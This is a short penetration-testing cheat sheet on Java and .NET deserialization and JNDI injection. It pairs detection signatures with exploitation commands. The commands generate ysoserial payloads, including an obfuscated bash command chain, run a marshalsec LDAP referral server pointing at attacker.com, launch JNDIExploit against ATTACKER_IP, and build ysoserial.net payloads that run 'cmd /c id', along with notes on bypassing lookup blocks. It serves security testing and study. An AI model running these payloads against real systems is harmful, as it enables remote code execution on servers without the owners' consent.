# Java Deserialization

## Detection

### Serialized Data Patterns
```
Base64: rO0AB (hex: aced 0005)
Hex: aced0005
ReadObject pattern in decompiled code
ObjectInputStream.readObject()
```

### ysoserial Usage
```bash
# List gadgets
java -jar ysoserial.jar

# Generate payload
java -jar ysoserial.jar CommonsCollections1 'id'
java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,BASE64}|{base64,-d}|{bash,-i}'

# Common chains
CommonsCollections1-7
CommonsBeanutils
Spring1/2
Groovy1
JRMPClient
JRMPListener
```

## JNDI Injection

### Detection
```java
// Look for:
InitialContext.lookup(userInput)
Context.lookup(userInput)
LDAP/RMI references in code
```

### Exploitation
```bash
# marshalsec
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com/#Exploit 1389

# JNDIExploit
java -jar JNDIExploit.jar -i ATTACKER_IP

# LDAP server
python3 -m py4jldap  # or use JNDIExploit
```

### JNDI Bypass
```
# If JndiLookup is blocked
# 1. Use different protocols: ldap://, ldaps://, rmi://, iiop://, corba://,nds://
# 2. Use 2.2.1 bypass
# 3. Use local classpath gadget
```

## ReadObject Patterns
```java
// Dangerous patterns
ObjectInputStream.readObject()
XMLDecoder.readObject()
Yaml.load()
XStream.fromXML()
Hessian.readObject()
Kryo.readObject()
Fastjson.parse()
```

## ysoserial.net (.NET)
```bash
# List gadgets
ysoserial.exe -l

# Generate payload
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c id"
ysoserial.exe -g PSObject -f Json.Net -c "cmd /c id"
```
